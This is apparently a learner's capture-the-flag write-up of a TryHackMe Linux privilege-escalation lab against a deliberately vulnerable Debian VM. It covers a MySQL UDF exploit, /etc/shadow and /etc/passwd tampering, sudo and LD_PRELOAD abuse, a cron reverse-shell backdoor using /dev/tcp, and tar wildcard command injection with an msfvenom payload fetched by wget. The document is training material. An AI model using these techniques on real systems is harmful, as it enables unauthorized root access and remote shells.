Task 1: Deploy the Vulnerable Debian VM 
```
This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Debian VM!

SSH should be available on port 22. You can login to the "user" account using the following command:

ssh user@10.10.106.19

If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type yes and press Enter.

The password for the "user" account is "password321".

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!
```
## run id command
```console
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

# Task 2 Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service


To check if mysql is runing as roo run: ```ps -u root | grep mysql```. The guide for this task is clear so I will not copy past stuff here. just gona write what I need to remember from this task. It might be helpful for me in the future:
1. download the exploit from the link above
2. complie the exploit by
```console
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
3. now run as mysql as root ```mysql -u rooot```
4. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our exploit:
```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
5. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission, then exit mysql
```mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```
6. run the /tmp/rootbash executable with -p to gain a shell running with root privileges: 
```console
$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# rm /tmp/rootbash
```

damnnnnn. The last command is removeing the the script. dont for get to romove it guys!!

# TASK 3: Weak File Permissions - Readable /etc/shadow 
```console
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
on my kali
```console
kali@kali:~/LinuxPrivEsc$ echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > root.txt
kali@kali:~/LinuxPrivEsc$ hashcat -a 0 -m 1800 -o cracked.txt root.txt /usr/share/wordlists/rockyou.txt --force
kali@kali:~/LinuxPrivEsc$ cat cracked.txt 
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:XXXXXXXXXXX
```
find out what XXXXXXXX is :P. GLHF

# Weak File Permissions - Writable /etc/shadow 
```console
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
damn we have write permission
```console
user@debian:~$ mkpasswd -m sha-512 kurohatwashere
$6$G5cFZMg03v81$/MHuRxqSlP8yFCqHOFIfQRXPwsor32wwUoPdE791lONV7YaviZQKi830I0TLuGj/kOj6OO9XI78Vx4CpYUGST0
user@debian:~$ nano /etc/shadow # replace root password (from 1st : to 2nd :) with the generated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami 
root
```

# Weak File Permissions - Writable /etc/passwd
```console
user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssl passwd gu2washere
Warning: truncating password to 8 characters
p7WxO7eoMHzVY
user@debian:~$ nano /etc/passwd # replace hash between 1st colon and 2 colon (replacing the "x") with the genarated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
```

another way to do it is create a new root user in ```/etc/passwd``` by copy the root row and append it to the buttom of the file. Change the password (replace "x" or put the genarated password between 1st and 2nd colon) and change the user name. the run ```su newroot``` to get ROOT

# Sudo - Shell Escape Sequences 
holly damn, this shit is super cool. bookmark it guys https://gtfobins.github.io/ !!
```console
user@debian:~$ sudo find . -exec /bin/sh \; -quit
sh-4.1# whoami
root
``` 

# task 7: Sudo - Environment Variables
this task was something new for me. it was hard to understand first but after reading through the task discription like 3 time then I got it.
```console
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD,
    env_keep+=LD_LIBRARY_PATH
```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.



Create a shared object using the code call preload.c which I included [here](preload.c)


```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c```


Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:


```sudo LD_PRELOAD=/tmp/preload.so program-name-here```


A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.



Run ldd against the apache2 program file to see which shared libraries are used by the program:

```console
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fffef3ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fb4bfb31000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fb4bf90d000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fb4bf6d3000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fb4bf4b7000)
        libc.so.6 => /lib/libc.so.6 (0x00007fb4bf14b000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fb4bef46000)
        librt.so.1 => /lib/librt.so.1 (0x00007fb4bed3e000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fb4beb07000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fb4be902000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fb4be6da000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb4bffee000)
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located [here](library_path.c)


```gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c```


Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):


```sudo LD_LIBRARY_PATH=/tmp apache2```


# Task 8 : Cron Jobs - file permissions
```console
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
two last cronjob run each min, ```overwrite.sh``` and ```/usr/local/bin/compress.sh```

```console
user@debian:~$ locate overwrite.sh # find the scrip
/usr/local/bin/overwrite.sh
user@debian:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
user@debian:~$ nano /usr/local/bin/overwrite.sh # edit the scrip
```
change the content in overwrite.sh to following os you can find script [here](bash_blackdoor.sh)
```bash
#!/bin/bash
bash -i >& /dev/tcp/<kali ip>/<port> 0>&1
```
gratz we just create backdoor, now run netcat and wait for the connection
```console
kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56477
bash: no job control in this shell
root@debian:~# whoami
whoami
root
```

# Task 9: Cron Jobs: PATH Environment Variable 
from last task we notice that the PATH variable starts with /home/user (```PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin```) which is our user's home directory. We can create a new file call  overwrite.sh and make it do something else, forinstance; copy create a new bash. So ```nano overwrite.sh``` and add this:
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```console
user@debian:~$ chmod +x /home/user/overwrite.sh # make it executable and wait 1 min for cron job run
user@debian:~$ /tmp/rootbash -p # now run it
rootbash-4.1# whoami
root
```

note that the cron job will go thought the path one by one, so you can put the script in any directory that included in the path. It is important to know that it is only work with cron job that a absolute path is not givven.

# Task 10 : Cron Jobs - Wildcards 
```console
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Note that the tar command is being run with a wildcard (*) in your home directory. Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature. Next step is create a reverse shell ELF binary using ```msfvenom```
```console
kali@kali:~/LinuxPrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ur ip> LPORT=<ur port> -f elf -o shell.elf # crate reverse shell
kali@kali:~/LinuxPrivEsc$ python -m SimpleHTTPServer 8000 # create a httpserver
```
now use wget to get the reverse shell ELF binary
```console
user@debian:~$ wget 10.8.14.151:8000/shell.elf
--2020-05-22 23:08:04--  http://10.8.14.151:8000/shell.elf
Connecting to 10.8.14.151:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: “shell.elf”

100%[====================>] 194         --.-K/s   in 0s      

2020-05-22 23:08:04 (25.2 MB/s) - “shell.elf” saved [194/194]

user@debian:~$ ls
myvpn.ovpn  overwrite.sh  shell.elf  test  tools
user@debian:~$ chmod +x /home/user/shell.elf # make it executable
user@debian:~$ touch /home/user/--checkpoint=1 # create 2 files
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames. now set up netcat and wait for cron job to execute our reverse shell
```console
kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56585
ls
--checkpoint-action=exec=shell.elf
--checkpoint=1
myvpn.ovpn
overwrite.sh
shell.elf
test
tools
whoami
root
```






